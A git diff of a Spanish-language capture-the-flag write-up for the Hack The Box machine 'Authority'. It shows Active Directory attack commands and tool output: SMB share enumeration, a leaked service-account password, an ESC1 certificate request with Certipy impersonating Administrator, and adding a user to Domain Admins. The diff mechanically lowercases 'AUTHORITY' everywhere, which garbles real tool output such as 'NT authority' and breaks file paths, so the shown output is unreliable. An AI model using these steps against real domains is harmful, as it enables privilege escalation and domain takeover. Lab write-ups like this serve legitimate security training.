@@ -1,5 +1,5 @@
 ---
-title: Authority
+title: authority
 date: 2024-10-02 12:26:00 +0800
 author: Justice-Reaper
 categories:
@@ -18,7 +18,7 @@ tags:
   - Create User and Add to Domain Admins with PassTheCert
   - PassTheHash (Psexec)
 image:
-  path: /assets/img/Authority/Authority.png
+  path: /assets/img/Authorityauthority.png
 ---
 
 ## Skills
@@ -43,7 +43,7 @@ image:
   
 ## Descripción
 
-`Authority` es una máquina `medium windows`, destaca los peligros de las `malas configuraciones`, la `reutilización de contraseñas`, el `almacenamiento de credenciales en recursos compartidos`, y cómo las `configuraciones predeterminadas en Active Directory` (como la capacidad de que todos los usuarios del dominio puedan agregar hasta 10 computadoras al dominio) pueden combinarse con otros fallos de seguridad (como las `plantillas de certificados vulnerables de AD CS`) para tomar el control de un dominio
+`authority` es una máquina `medium windows`, destaca los peligros de las `malas configuraciones`, la `reutilización de contraseñas`, el `almacenamiento de credenciales en recursos compartidos`, y cómo las `configuraciones predeterminadas en Active Directory` (como la capacidad de que todos los usuarios del dominio puedan agregar hasta 10 computadoras al dominio) pueden combinarse con otros fallos de seguridad (como las `plantillas de certificados vulnerables de AD CS`) para tomar el control de un dominio
 
 ---
 ## Reconocimiento
@@ -281,8 +281,8 @@ Nmap done: 1 IP address (1 host up) scanned in 40.90 seconds
 
 ```
 # netexec smb 10.129.229.56 -u 'guest' -p ''           
-SMB         10.129.229.56   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
-SMB         10.129.229.56   445    AUTHORITY        [+] authority.htb\guest: 
+SMB         10.129.229.56   445    authority        [*] Windows 10 / Server 2019 Build 17763 x64 (name:authority) (domain:authority.htb) (signing:True) (SMBv1:False)
+SMB         10.129.229.56   445    authority        [+] authority.htb\guest: 
 ```
 
 `Agregamos` el `dominio` y el `nombre` de la `máquina` al `/etc/hosts`
@@ -290,7 +290,7 @@ SMB         10.129.229.56   445    AUTHORITY        [+] authority.htb\guest:
 ```
 127.0.0.1       localhost
 127.0.1.1       kali-linux
-10.129.229.56   authority.htb  AUTHORITY
+10.129.229.56   authority.htb  authority
 
 # The following lines are desirable for IPv6 capable hosts
 ::1     localhost ip6-localhost ip6-loopback
@@ -302,18 +302,18 @@ ff02::2 ip6-allrouters
 
 ```
 # netexec smb 10.129.229.56 -u 'guest' -p '' --shares  
-SMB         10.129.229.56   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
-SMB         10.129.229.56   445    AUTHORITY        [+] authority.htb\guest: 
-SMB         10.129.229.56   445    AUTHORITY        [*] Enumerated shares
-SMB         10.129.229.56   445    AUTHORITY        Share           Permissions     Remark
-SMB         10.129.229.56   445    AUTHORITY        -----           -----------     ------
-SMB         10.129.229.56   445    AUTHORITY        ADMIN$                          Remote Admin
-SMB         10.129.229.56   445    AUTHORITY        C$                              Default share
-SMB         10.129.229.56   445    AUTHORITY        Department Shares                 
-SMB         10.129.229.56   445    AUTHORITY        Development     READ            
-SMB         10.129.229.56   445    AUTHORITY        IPC$            READ            Remote IPC
-SMB         10.129.229.56   445    AUTHORITY        NETLOGON                        Logon server share 
-SMB         10.129.229.56   445    AUTHORITY        SYSVOL                          Logon server share 
+SMB         10.129.229.56   445    authority        [*] Windows 10 / Server 2019 Build 17763 x64 (name:authority) (domain:authority.htb) (signing:True) (SMBv1:False)
+SMB         10.129.229.56   445    authority        [+] authority.htb\guest: 
+SMB         10.129.229.56   445    authority        [*] Enumerated shares
+SMB         10.129.229.56   445    authority        Share           Permissions     Remark
+SMB         10.129.229.56   445    authority        -----           -----------     ------
+SMB         10.129.229.56   445    authority        ADMIN$                          Remote Admin
+SMB         10.129.229.56   445    authority        C$                              Default share
+SMB         10.129.229.56   445    authority        Department Shares                 
+SMB         10.129.229.56   445    authority        Development     READ            
+SMB         10.129.229.56   445    authority        IPC$            READ            Remote IPC
+SMB         10.129.229.56   445    authority        NETLOGON                        Logon server share 
+SMB         10.129.229.56   445    authority        SYSVOL                          Logon server share 
 ```
 
 Nos conectamos con `smbclient` y nos `descargamos` en nuestro equipo todos los `recursos` `compartidos` por `smb`
@@ -561,8 +561,8 @@ Pulsamos en `Test LDAP Profile` y `capturamos` una `autenticación`
 
 ```
 # netexec winrm 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'               
-WINRM       10.129.229.56   5985   AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
-WINRM       10.129.229.56   5985   AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)
+WINRM       10.129.229.56   5985   authority        [*] Windows 10 / Server 2019 Build 17763 (name:authority) (domain:authority.htb)
+WINRM       10.129.229.56   5985   authority        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)
 ```
 
 Nos `conectamos` a la `máquina víctima`
@@ -605,10 +605,10 @@ BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandat
 BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
 BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
 BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+NT authority\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT authority\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT authority\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT authority\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
 Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
 
 
@@ -644,7 +644,7 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\svc_ldap\Documents> upload adPEAS.ps1
                                         
-Info: Uploading /home/justice-reaper/Desktop/Authority/scripts/adPEAS/adPEAS.ps1 to C:\Users\svc_ldap\Documents\adPEAS.ps1
+Info: Uploading /home/justice-reaper/Desktop/Authorityscripts/adPEAS/adPEAS.ps1 to C:\Users\svc_ldap\Documents\adPEAS.ps1
                                         
 Data: 4655524 bytes of 4655524 bytes copied
                                         
@@ -743,15 +743,15 @@ memberOf:				CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=authority,DC=ht
 [+] Found at least one available Active Directory Certificate Service
 adPEAS does basic enumeration only, consider reading https://posts.specterops.io/certified-pre-owned-d95910965cd2
 
-[+] Found Active Directory Certificate Services 'AUTHORITY-CA':
-CA Name:				AUTHORITY-CA
+[+] Found Active Directory Certificate Services 'authority-CA':
+CA Name:				authority-CA
 CA dnshostname:				authority.authority.htb
 CA IP Address:				10.129.229.56
 Date of Creation:			04/24/2023 01:56:26
-DistinguishedName:			CN=AUTHORITY-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=authority,DC=htb
+DistinguishedName:			CN=authority-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=authority,DC=htb
 NTAuthCertificates:			True
 Available Templates:			CorpVPN
-					AuthorityLDAPS
+					authorityLDAPS
 					DirectoryEmailReplication
 					DomainControllerAuthentication
 					KerberosAuthentication
@@ -778,7 +778,7 @@ EnrollmentFlag:				INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT_
 [!] CertificateNameFlag:		ENROLLEE_SUPPLIES_SUBJECT
 [+] Enrollment allowed for:		HTB\Domain Computers
 
-[?] +++++ Checking Template 'AuthorityLDAPS' +++++
+[?] +++++ Checking Template 'authorityLDAPS' +++++
 
 [?] +++++ Checking Template 'DirectoryEmailReplication' +++++
 
@@ -955,8 +955,8 @@ userAccountControl:			NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
 [+] admincount:				This identity is or was member of a high privileged admin group
  
 [+] Found members in group 'HTB\Cert Publishers':
-sAMAccountName:				AUTHORITY$
-distinguishedName:			CN=AUTHORITY,OU=Domain Controllers,DC=authority,DC=htb
+sAMAccountName:				authority$
+distinguishedName:			CN=authority,OU=Domain Controllers,DC=authority,DC=htb
 objectSid:				S-1-5-21-622327497-3269355298-2248959698-1000
 operatingsystem:			Windows Server 2019 Standard
 memberOf:				CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=authority,DC=htb
@@ -973,9 +973,9 @@ lastLogonTimestamp:			10/09/2024 08:08:30
 [?] +++++ Starting Computer Enumeration +++++
 
 [?] +++++ Searching for Domain Controllers +++++
-[+] Found Domain Controller 'AUTHORITY$':
-sAMAccountName:				AUTHORITY$
-distinguishedName:			CN=AUTHORITY,OU=Domain Controllers,DC=authority,DC=htb
+[+] Found Domain Controller 'authority$':
+sAMAccountName:				authority$
+distinguishedName:			CN=authority,OU=Domain Controllers,DC=authority,DC=htb
 objectSid:				S-1-5-21-622327497-3269355298-2248959698-1000
 operatingsystem:			Windows Server 2019 Standard
 memberOf:				CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=authority,DC=htb
@@ -988,9 +988,9 @@ lastLogonTimestamp:			10/09/2024 08:08:30
 [?] +++++ Searching for Exchange Servers +++++
 
 [?] +++++ Searching for ADCS Servers +++++
-[+] Found ADCS Server 'AUTHORITY$':
-sAMAccountName:				AUTHORITY$
-distinguishedName:			CN=AUTHORITY,OU=Domain Controllers,DC=authority,DC=htb
+[+] Found ADCS Server 'authority$':
+sAMAccountName:				authority$
+distinguishedName:			CN=authority,OU=Domain Controllers,DC=authority,DC=htb
 objectSid:				S-1-5-21-622327497-3269355298-2248959698-1000
 operatingsystem:			Windows Server 2019 Standard
 memberOf:				CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=authority,DC=htb
@@ -1022,17 +1022,17 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Finding certificate authorities
 [*] Found 1 certificate authority
 [*] Found 13 enabled certificate templates
-[*] Trying to get CA configuration for 'AUTHORITY-CA' via CSRA
-[!] Got error while trying to get CA configuration for 'AUTHORITY-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
-[*] Trying to get CA configuration for 'AUTHORITY-CA' via RRP
+[*] Trying to get CA configuration for 'authority-CA' via CSRA
+[!] Got error while trying to get CA configuration for 'authority-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying to get CA configuration for 'authority-CA' via RRP
 [!] Failed to connect to remote registry. Service should be starting now. Trying again...
-[*] Got CA configuration for 'AUTHORITY-CA'
+[*] Got CA configuration for 'authority-CA'
 [*] Enumeration output:
 Certificate Authorities
   0
-    CA Name                             : AUTHORITY-CA
+    CA Name                             : authority-CA
     DNS Name                            : authority.authority.htb
-    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
+    Certificate Subject                 : CN=authority-CA, DC=authority, DC=htb
     Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
     Certificate Validity Start          : 2023-04-24 01:46:26+00:00
     Certificate Validity End            : 2123-04-24 01:56:25+00:00
@@ -1041,20 +1041,20 @@ Certificate Authorities
     Request Disposition                 : Issue
     Enforce Encryption for Requests     : Enabled
     Permissions
-      Owner                             : AUTHORITY.HTB\Administrators
+      Owner                             : authority.HTB\Administrators
       Access Rights
-        ManageCertificates              : AUTHORITY.HTB\Administrators
-                                          AUTHORITY.HTB\Domain Admins
-                                          AUTHORITY.HTB\Enterprise Admins
-        ManageCa                        : AUTHORITY.HTB\Administrators
-                                          AUTHORITY.HTB\Domain Admins
-                                          AUTHORITY.HTB\Enterprise Admins
-        Enroll                          : AUTHORITY.HTB\Authenticated Users
+        ManageCertificates              : authority.HTB\Administrators
+                                          authority.HTB\Domain Admins
+                                          authority.HTB\Enterprise Admins
+        ManageCa                        : authority.HTB\Administrators
+                                          authority.HTB\Domain Admins
+                                          authority.HTB\Enterprise Admins
+        Enroll                          : authority.HTB\Authenticated Users
 Certificate Templates
   0
     Template Name                       : CorpVPN
     Display Name                        : Corp VPN
-    Certificate Authorities             : AUTHORITY-CA
+    Certificate Authorities             : authority-CA
     Enabled                             : True
     Client Authentication               : True
     Enrollment Agent                    : False
@@ -1080,22 +1080,22 @@ Certificate Templates
     Minimum RSA Key Length              : 2048
     Permissions
       Enrollment Permissions
-        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
-                                          AUTHORITY.HTB\Domain Admins
-                                          AUTHORITY.HTB\Enterprise Admins
+        Enrollment Rights               : authority.HTB\Domain Computers
+                                          authority.HTB\Domain Admins
+                                          authority.HTB\Enterprise Admins
       Object Control Permissions
-        Owner                           : AUTHORITY.HTB\Administrator
-        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
-                                          AUTHORITY.HTB\Enterprise Admins
-                                          AUTHORITY.HTB\Administrator
-        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
-                                          AUTHORITY.HTB\Enterprise Admins
-                                          AUTHORITY.HTB\Administrator
-        Write Property Principals       : AUTHORITY.HTB\Domain Admins
-                                          AUTHORITY.HTB\Enterprise Admins
-                                          AUTHORITY.HTB\Administrator
+        Owner                           : authority.HTB\Administrator
+        Write Owner Principals          : authority.HTB\Domain Admins
+                                          authority.HTB\Enterprise Admins
+                                          authority.HTB\Administrator
+        Write Dacl Principals           : authority.HTB\Domain Admins
+                                          authority.HTB\Enterprise Admins
+                                          authority.HTB\Administrator
+        Write Property Principals       : authority.HTB\Domain Admins
+                                          authority.HTB\Enterprise Admins
+                                          authority.HTB\Administrator
     [!] Vulnerabilities
-      ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
+      ESC1                              : 'authority.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
 ```
 
 Vemos que el dns es `authority.authority.htb` por lo tanto debemos añadirlo al `/etc/hosts`
@@ -1103,7 +1103,7 @@ Vemos que el dns es `authority.authority.htb` por lo tanto debemos añadirlo al 
 ```
 127.0.0.1       localhost
 127.0.1.1       kali-linux
-10.129.229.56   authority.htb authority.authority.htb AUTHORITY
+10.129.229.56   authority.htb authority.authority.htb authority
 
 # The following lines are desirable for IPv6 capable hosts
 ::1     localhost ip6-localhost ip6-loopback
@@ -1118,10 +1118,10 @@ Observamos que como `usuario` no podemos `explotar` esta `vulnerabilidad`, debem
 
 /usr/lib/python3/dist-packages/bloodhound/ad/utils.py:115: SyntaxWarning: invalid escape sequence '\-'
   xml_sid_rex = re.compile('<UserId>(S-[0-9\-]+)</UserId>')
-SMB         10.129.229.56   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
-LDAPS       10.129.229.56   636    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
-MAQ         10.129.229.56   389    AUTHORITY        [*] Getting the MachineAccountQuota
-MAQ         10.129.229.56   389    AUTHORITY        MachineAccountQuota: 10
+SMB         10.129.229.56   445    authority        [*] Windows 10 / Server 2019 Build 17763 x64 (name:authority) (domain:authority.htb) (signing:True) (SMBv1:False)
+LDAPS       10.129.229.56   636    authority        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
+MAQ         10.129.229.56   389    authority        [*] Getting the MachineAccountQuota
+MAQ         10.129.229.56   389    authority        MachineAccountQuota: 10
 ```
 
 Podemos `crear` una `máquina` en el equipo con este `comando`
@@ -1146,7 +1146,7 @@ CLOCK: time stepped by 14400.157112
 Para `ESC1`, podemos `solicitar` un `certificado` basado en la `plantilla` de `certificado vulnerable` y especificar un `UPN` o un `SAN DNS` arbitrario con los parámetros `-upn` y `-dns`, respectivamente.
 
 ```
-# certipy-ad req -u 'TEST$' -p 'password' -ca AUTHORITY-CA -target authority.authority.htb -dc-ip 10.129.229.56 -dns authority.htb -template CorpVPN -upn Administrator@authority.htb  
+# certipy-ad req -u 'TEST$' -p 'password' -ca authority-CA -target authority.authority.htb -dc-ip 10.129.229.56 -dns authority.htb -template CorpVPN -upn Administrator@authority.htb  
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 /usr/lib/python3/dist-packages/certipy/commands/req.py:459: SyntaxWarning: invalid escape sequence '\('
@@ -1245,8 +1245,8 @@ Adding user: test to group Domain Admins result: OK
 
 ```
 # netexec smb 10.129.229.56 -u test -p ',J94rysf}$Ud|I;'                 
-SMB         10.129.229.56   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
-SMB         10.129.229.56   445    AUTHORITY        [+] authority.htb\test:,J94rysf}$Ud|I; (Pwn3d!)
+SMB         10.129.229.56   445    authority        [*] Windows 10 / Server 2019 Build 17763 x64 (name:authority) (domain:authority.htb) (signing:True) (SMBv1:False)
+SMB         10.129.229.56   445    authority        [+] authority.htb\test:,J94rysf}$Ud|I; (Pwn3d!)
 ```
 
 Nos `conectamos` con `psexec` a la máquina víctima
